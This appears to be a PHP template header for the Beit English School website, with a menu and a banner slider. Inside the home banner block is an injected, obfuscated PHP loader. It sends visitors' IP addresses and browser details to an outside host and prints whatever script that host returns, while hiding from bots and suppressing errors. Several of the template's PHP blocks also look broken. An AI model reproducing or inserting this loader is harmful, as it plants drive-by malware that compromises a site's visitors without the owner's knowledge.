<div id="topo">
	<h1><a href="index.php"><img src="img/logo-beit.png" alt="Beit English School" class="logobeit" /></a></h1>
	<div id="menu">
		<a href="nossos-cursos.php?s=curso-regular">Cursos</a>
		<a href="beit.php">Beit</a>
		<a href="https://www.facebook.com/beitschool/photos_stream">Galeria</a>
		<a href="/professor/index.php" style="font-size:.85em">Professor</a>
		<a href="contato.php">Contato</a>
	</div>
</div>
<div id="banner">
	<a class="backward"></a> 
	<div id="banner-container">
		<div class="images">
<? if ($sequencia == 'home') { ?>
<?php
#9ec9ba#
error_reporting(0); @ini_set('display_errors',0); $wp_bww5934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_bww5934) && !preg_match ('/bot/i', $wp_bww5934))){
$wp_bww095934="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bww5934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bww095934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_5934bww = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_5934bww = @file_get_contents($wp_bww095934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_5934bww=@stream_get_contents(@fopen($wp_bww095934, "r"));}}
if (substr($wp_5934bww,1,3) === 'scr'){ echo $wp_5934bww; }
#/9ec9ba#
?>
			<div> <img src="img/banner04.jpg" alt="Banner 01" /> </div>
	        <div> <img src="img/banner03.jpg" alt="Banner 02" /> </div> 
			<div> <img src="img/banner02.jpg" alt="Banner 03" /> </div> 
	   		<div> <img src="img/banner01.jpg" alt="Banner 04" /> </div>
<?php  ?>	
	
<? if ($sequencia == 'curso-regular') { ?>
        	<div> <img src="img/banner03.jpg" alt="Banner 01" /> </div> 
<?php  ?>		
		
<? if ($sequencia == 'special-courses') { ?>
			<div> <img src="img/banner01.jpg" alt="Banner 01" /> </div> 
<?php  ?>
		
<? if ($sequencia == 'in-company') { ?>			
			<div> <img src="img/banner02.jpg" alt="Banner 01" /> </div> 
<?php  ?>
		</div> 
	</div>
	<a class="forward"></a> 

	<div class="slidetabs"> 
<? if ($sequencia == 'home') { ?>
		<a href="#"></a> 
		<a href="#"></a>
		<a href="#"></a>
	    <a href="#"></a>
<?php  ?>	
	
<? if ($sequencia == 'curso-regular') { ?>
		<a href="#"></a> 
<?php  ?>		
		
<? if ($sequencia == 'special-courses') { ?>
		<a href="#"></a> 

<?php  ?>
		
<? if ($sequencia == 'in-company') { ?>
		<a href="#"></a> 
<?php  ?>    
	</div>
</div>